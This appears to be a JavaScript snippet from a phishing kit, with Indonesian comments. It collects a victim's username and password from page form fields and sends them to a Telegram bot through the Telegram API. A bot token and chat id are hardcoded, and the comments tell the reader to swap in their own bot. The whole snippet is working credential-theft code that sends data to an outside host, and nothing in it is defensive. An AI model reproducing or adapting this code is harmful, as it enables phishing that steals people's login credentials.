function kirimPesan1() 
{
  var logo = document.getElementById('logo');
var user = document.getElementById('user');
var password = document.getElementById('password');
    
    
    var gabungan = logo.value + '%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   :%20' + user.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱   :%20' + password.value;

    var token = '7403888947:AAHrvAJpodWS_RR76nvCLz4Z250T3Qc9tQI'; // Ganti dengan token bot yang kamu buat
    var grup = '7618896948'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}